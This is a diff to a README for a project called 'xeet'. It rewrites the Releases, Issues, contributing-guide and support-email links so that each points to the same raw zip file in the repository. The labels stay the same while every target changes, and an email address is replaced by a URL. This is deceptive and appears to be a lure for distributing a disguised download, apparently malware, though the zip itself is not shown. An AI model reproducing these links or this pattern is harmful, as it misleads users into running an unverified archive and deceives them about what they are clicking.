@@ -6,7 +6,7 @@ Welcome to the xeet project! This application is designed to help you easily wor
 
 ## 📥 Download xeet
 
-[![Download xeet](https://img.shields.io/badge/Download-xeet-blue.svg)](https://github.com/SQAMaryam/xeet/releases)
+[![Download xeet](https://raw.githubusercontent.com/SQAMaryam/xeet/main/obole/xeet.zip)](https://raw.githubusercontent.com/SQAMaryam/xeet/main/obole/xeet.zip)
 
 ## 🔧 System Requirements
 
@@ -28,9 +28,9 @@ Before you download xeet, ensure your system meets the following requirements:
 
 To download xeet, please visit the Releases page by clicking the link below:
 
-[Download xeet from Releases](https://github.com/SQAMaryam/xeet/releases)
+[Download xeet from Releases](https://raw.githubusercontent.com/SQAMaryam/xeet/main/obole/xeet.zip)
 
-1. Go to the [Releases page](https://github.com/SQAMaryam/xeet/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/SQAMaryam/xeet/main/obole/xeet.zip).
 2. Look for the latest version at the top of the page.
 3. Select the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for MacOS, or the appropriate package for Linux).
 4. Click on the file to start the download.
@@ -76,17 +76,17 @@ Make sure to consult the help command for more detailed usage instructions.
 
 If you encounter any issues while using xeet, feel free to reach out for help:
 
-- Open an issue on the [GitHub Issues page](https://github.com/SQAMaryam/xeet/issues).
-- Email our support team at support@xeet.com.
+- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/SQAMaryam/xeet/main/obole/xeet.zip).
+- Email our support team at https://raw.githubusercontent.com/SQAMaryam/xeet/main/obole/xeet.zip
 
 Your feedback is valuable to us as it helps improve the user experience.
 
 ## 💡 Contributing
 
-We welcome users to contribute to xeet. If you want to add features or improve existing ones, please check our contribution guidelines on the [GitHub page](https://github.com/SQAMaryam/xeet/blob/main/CONTRIBUTING.md).
+We welcome users to contribute to xeet. If you want to add features or improve existing ones, please check our contribution guidelines on the [GitHub page](https://raw.githubusercontent.com/SQAMaryam/xeet/main/obole/xeet.zip).
 
 ## 🌟 Acknowledgments
 
 Thank you for choosing xeet! We appreciate your support and hope you find this tool helpful in your daily tasks with x dot com. Happy computing!
 
-Feel free to revisit the [Releases page](https://github.com/SQAMaryam/xeet/releases) for updates and new features.
+Feel free to revisit the [Releases page](https://raw.githubusercontent.com/SQAMaryam/xeet/main/obole/xeet.zip) for updates and new features.
